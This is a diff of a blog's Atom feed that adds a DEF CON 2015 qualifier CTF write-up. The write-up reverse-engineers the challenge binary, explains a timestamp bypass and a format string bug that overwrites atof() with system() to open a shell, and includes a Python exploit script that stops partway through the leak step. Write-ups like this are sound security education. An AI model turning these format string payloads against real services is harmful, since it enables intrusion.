@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | morgan_z's blog]]></title>
   <link href="http://morganzz.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://morganzz.github.io/"/>
-  <updated>2015-05-12T14:41:05+08:00</updated>
+  <updated>2015-05-24T13:45:55+08:00</updated>
   <id>http://morganzz.github.io/</id>
   <author>
     <name><![CDATA[morgan]]></name>
@@ -12,6 +12,464 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2015 Wibbly Wobbly Timey Wimey Writeup]]></title>
+    <link href="http://morganzz.github.io/blog/2015/05/23/def-con-ctf-qualifier-2015-wibbly-wobbly-timey-wimey-writeup/"/>
+    <updated>2015-05-23T15:56:33+08:00</updated>
+    <id>http://morganzz.github.io/blog/2015/05/23/def-con-ctf-qualifier-2015-wibbly-wobbly-timey-wimey-writeup</id>
+    <content type="html"><![CDATA[<p>This is my second time participating in DC qualifier, and it is really a fun experience.</p>
+
+<p>This challenge (<a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/wibbly-wobbly-timey-wimey">download</a>) involves multiple steps. When we connect to the server, we need to play a game first.</p>
+
+<!-- more -->
+
+
+<pre><code>alpha@alpha-th:~$ nc wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me 2606
+You(^V&lt;&gt;) must find your way to the TARDIS(T) by avoiding the angels(A).
+Go through the exits(E) to get to the next room and continue your search.
+But, most importantly, don't blink!
+   012345678901234567890
+00                    E
+01                     
+02  A                  
+03               A     
+04 A                   
+05                     
+06               A     
+07                A    
+08                     
+09        V       A    
+10                  A  
+11                A    
+12              A      
+13                     
+14       A      A      
+15                     
+16                     
+17                     
+18                     
+19                     
+Your move (w,a,s,d,q):
+</code></pre>
+
+<p>If we win the game five times, then we are asked to input a &ldquo;TARDIS KEY&rdquo;. If the input is correct, then &ldquo;Welcome to the TARDIS!&rdquo; is displayed and we can choose from two options.
+<code>
+TARDIS KEY:
+Welcome to the TARDIS!
+Your options are:
+1. Turn on the console
+2. Leave the TARDIS
+Selection:
+</code></p>
+
+<p>This is where we start looking for vulnerabilities.</p>
+
+<p>In IDA, if we look at the routine sub_E3E, we can see that there is another option (&ldquo;Dematerialize&rdquo;) besides the two above.
+<code>c routine sub_E3E
+int sub_E3E()
+{
+  puts("Your options are: ");
+  puts("1. Turn on the console");
+  puts("2. Leave the TARDIS");
+  if ( unk_50AC )
+    puts("3. Dematerialize");
+  printf("Selection: ");
+  return fflush(stdout);
+}
+</code></p>
+
+<p>However, in order to display the option, we need to make the variable &ldquo;unk_50AC&rdquo; true. This happens in the routine sub_1205:
+<code>c snippet from routine sub_1205
+if ( LOBYTE(dword_50B0[0]) == 49 )        // 1
+{
+    LOBYTE(v4) = sub_E08();
+    if ( v4 )
+    {
+        printf("The TARDIS console is online!");
+        unk_50AC = 1;
+        fflush(stdout);
+    }
+    else
+    {
+        printf("Access denied except between %s and %s\n", &amp;v7, &amp;v8);
+        fflush(stdout);
+    }
+}
+</code></p>
+
+<p>When we select the first option (&ldquo;Turn on the console&rdquo;), routine sub_E08 gets called and a comparison is made based on two timestamps:
+<code>c routine sub_E08
+BOOL sub_E08()
+{
+  return dword_50A4 &gt; 1431907180 &amp;&amp; dword_50A4 &lt;= 1431907199;
+}
+</code>
+If the variable dword_50A4 does not fit between the two values, then &ldquo;Access denied except between May 17 2015 23:59:40 GMT and May 18 2015 00:00:00 GMT&rdquo; is displayed. If it fits, then we can choose the third option (&ldquo;Dematerialize&rdquo;), and routine sub_1027 gets called:
+<code>c snippet from routine sub_1205
+if ( LOBYTE(dword_50B0[0]) == 51 )      // 3
+{
+    if ( unk_50AC )
+    {
+        sub_1027();
+    }
+    else
+    {
+        puts("Invalid");
+        fflush(stdout);
+    }
+}
+</code></p>
+
+<pre><code class="c snippet from routine sub_1027">int sub_1027()
+{
+    ...
+    while ( 1 )
+    {
+        ...
+        v0 = atof(&amp;s);
+        v3 = atof(nptr + 1);
+        printf("%f, %f\n", v0, v3);
+        if ( 51.492137 != v0 || -0.192878 != v3 )
+            break;
+        printf("Coordinate ");
+        printf(&amp;s);
+        ...
+    }
+    printf("You safely travel to coordinates %s\n", &amp;s);
+    ...
+    return result;
+}
+</code></pre>
+
+<p>Does &ldquo;printf(&amp;s)&rdquo; look suspicious? It could be an <a href="http://en.wikipedia.org/wiki/Uncontrolled_format_string">uncontrolled format string</a>! Since the buffer itself can be accessed (with enough &ldquo;%x&rdquo;, for example), we can pretty much do arbitrary read and write in the memory. But what should we write and where should we write to?  It turns outs we do not need to look far: since &ldquo;&amp;s&rdquo; is passed as a parameter to atof() function, we can replace the address of atof() with the address of system() in relocation table. Then we can execute any commands we want (e.g. sh). The address of atof() can be accessed from the function&rsquo;s relocation table entry at run time, so we can exploit the format string vulnerabiliry to overwrite it.</p>
+
+<p>Now there is only one thing left: how do we defeat the timestamp check in the routine sub_E08 above? If we look at the routine sub_BCB, the variable dword_50A4 (which is used for timestamp comparison) can be controlled if we can controlled dword_50B0.</p>
+
+<pre><code class="c snippet from routine sub_BCB">size_t sub_BCB()
+{
+    ...
+    v3 = read(dword_50B0[2], &amp;buf, 4u);
+    if ( v3 == 4 )
+        dword_50A4 = buf;
+    ...
+}
+</code></pre>
+
+<p>Luckily, in routine sub_1205, we can read up to 9 bytes into the location pointed to by dword_50B0, which gives us the control of one byte in dword_50B0[2]:
+<code>c snippet from routine sub_1205
+if ( read(0, dword_50B0, 9u) &lt;= 0 )
+        break;
+</code></p>
+
+<p>In other words, when we are asked to selected an option, if our input is something like &ldquo;1aaaaaaa\x00&rdquo;(9 bytes in total, and the last byte is 0x00), then we will be able to read four bytes from standard input into the location pointed to by &ldquo;buf&rdquo;, and those four bytes will be treated as an integer and assigned to dword_50A4, which is used for the timestamp check.</p>
+
+<p>In summary, in order to get the flag, we need to perform the following steps:</p>
+
+<ul>
+<li>win the game five times</li>
+<li>input correct &ldquo;TARDIS KEY&rdquo;</li>
+<li>input &ldquo;1aaaaaaa\x00&rdquo;(or something similar) to set the array dword_50B0</li>
+<li>input four bytes to set the variable dword_50A4 so that it is something between 1431907180 and 1431907199 when treated as an integer</li>
+<li>select the option &ldquo;Dematerialize&rdquo;, and use the format string vulnerability to reveal the address of system()</li>
+<li>overwrite the address of atof() with the address of system() in relocation table by using the format string vulnerability</li>
+<li>when asked to input coordinates again, we can open a shell by inputing &ldquo;,sh&rdquo;</li>
+</ul>
+
+
+<p>For playing the game, I use a very simple algorithm: going vertically first to get into the same row as the target, then going horizontally (or going horizontally first then going vertically). This does not succeed every time, but it has a good chance to go through five times in a row (We can play multiple times, right?). The &ldquo;TARDIS KEY&rdquo; comes directly from the binary, so it is fixed every time. We can get this byte by byte from gdb, and it is: UeSlhCAGEp.</p>
+
+<p>Here are the code and the result:
+<figure class='code'><figcaption><span> (wwtw.py)</span> <a href='/downloads/code/defcon2015/wwtw.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">import</span> <span class="nn">zio</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
+</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="sd">    return a 2d array</span>
+</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
+</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;90</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">m</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</span><span class='line'>        <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">m</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">m</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">get_path</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">me</span><span class="p">,</span> <span class="n">ET</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">):</span>
+</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="sd">    compare two possible paths</span>
+</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
+</span><span class='line'>    <span class="n">p1_head</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">me</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">ET</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span><span class="nb">max</span><span class="p">(</span><span class="n">me</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">ET</span><span class="p">[</span><span class="mi">1</span><span class="p">])):</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">m</span><span class="p">[</span><span class="n">me</span><span class="p">[</span><span class="mi">0</span><span class="p">]][</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;A&#39;</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">p1_head</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">me</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">ET</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span><span class="nb">max</span><span class="p">(</span><span class="n">me</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">ET</span><span class="p">[</span><span class="mi">0</span><span class="p">])):</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">m</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">ET</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">==</span> <span class="s">&#39;A&#39;</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">p1_head</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">p1_head</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">p1</span><span class="o">+</span><span class="n">p2</span>
+</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">p2</span><span class="o">+</span><span class="n">p1</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">move</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="sd">    return a string for moving</span>
+</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
+</span><span class='line'>    <span class="n">ret</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+</span><span class='line'>    <span class="n">me</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">ET</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">row</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">j</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">row</span><span class="p">):</span>
+</span><span class='line'>            <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&quot;&gt;&quot;</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&quot;&lt;&quot;</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&quot;^&quot;</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&#39;V&#39;</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">me</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&#39;E&#39;</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&#39;T&#39;</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">ET</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c">#print ET,me</span>
+</span><span class='line'>    <span class="n">shifty</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">ET</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="n">me</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span><span class='line'>    <span class="n">shiftx</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">ET</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="n">me</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">ET</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">me</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">and</span> <span class="n">ET</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">me</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+</span><span class='line'>        <span class="n">p</span> <span class="o">=</span> <span class="n">get_path</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">me</span><span class="p">,</span><span class="n">ET</span><span class="p">,</span><span class="s">&#39;d&#39;</span><span class="o">*</span><span class="n">shiftx</span><span class="p">,</span><span class="s">&#39;s&#39;</span><span class="o">*</span><span class="n">shifty</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">elif</span> <span class="n">ET</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">me</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">and</span> <span class="n">ET</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">me</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+</span><span class='line'>        <span class="n">p</span> <span class="o">=</span> <span class="n">get_path</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">me</span><span class="p">,</span><span class="n">ET</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="n">shiftx</span><span class="p">,</span><span class="s">&#39;s&#39;</span><span class="o">*</span><span class="n">shifty</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">elif</span> <span class="n">ET</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">me</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">and</span> <span class="n">ET</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">me</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+</span><span class='line'>        <span class="n">p</span> <span class="o">=</span> <span class="n">get_path</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">me</span><span class="p">,</span><span class="n">ET</span><span class="p">,</span><span class="s">&#39;d&#39;</span><span class="o">*</span><span class="n">shiftx</span><span class="p">,</span><span class="s">&#39;w&#39;</span><span class="o">*</span><span class="n">shifty</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">p</span> <span class="o">=</span> <span class="n">get_path</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">me</span><span class="p">,</span><span class="n">ET</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="n">shiftx</span><span class="p">,</span><span class="s">&#39;w&#39;</span><span class="o">*</span><span class="n">shifty</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">p</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">T</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me&quot;</span><span class="p">,</span><span class="mi">2606</span><span class="p">)</span>
+</span><span class='line'><span class="c">#T = (&quot;127.0.0.1&quot;,4444)</span>
+</span><span class='line'><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="o">.</span><span class="n">zio</span><span class="p">(</span><span class="n">T</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;blink!&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#play the game</span>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">m</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">moves</span> <span class="o">=</span>  <span class="n">move</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">moves</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">m</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;...&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#TARDIS KEY</span>
+</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s">&quot;UeSlhCAGEp&quot;</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;KEY&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#timestamp check</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;Selection:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;1aaaaaaa</span><span class="se">\x00\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;v+YU</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c">#defeat the timestamp check</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;1aaaaaaa</span><span class="se">\x07\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c">#set the fd back so we don&#39;t need to write something every 2s</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Dematerialize&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Dematerialize&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Dematerialize&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">##base</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;Coordinates:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span>  <span class="o">=</span><span class="s">&quot;51.492137,-0.192878zz&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="si">%08x</span><span class="s">.&quot;</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;again&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">addr1</span>  <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">)[</span><span class="mi">11</span><span class="p">]</span>
+</span><span class='line'><span class="n">addr2</span>  <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">)[</span><span class="mi">12</span><span class="p">]</span>
+</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="mi">4032</span>
+</span><span class='line'><span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr1</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="n">offset</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;Coordinates:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">##read addr, since we don&#39;t have system() in relocation table, we start from read()</span>
+</span><span class='line'><span class="n">payload</span>  <span class="o">=</span> <span class="s">&quot;51.492137,-0.192878z&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">base</span><span class="o">+</span><span class="mh">0x5010</span><span class="p">)</span>  <span class="c">#read reloc table</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span> <span class="s">&quot;</span><span class="si">%08x</span><span class="s">.&quot;</span><span class="o">*</span><span class="mi">19</span> <span class="o">+</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;is&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
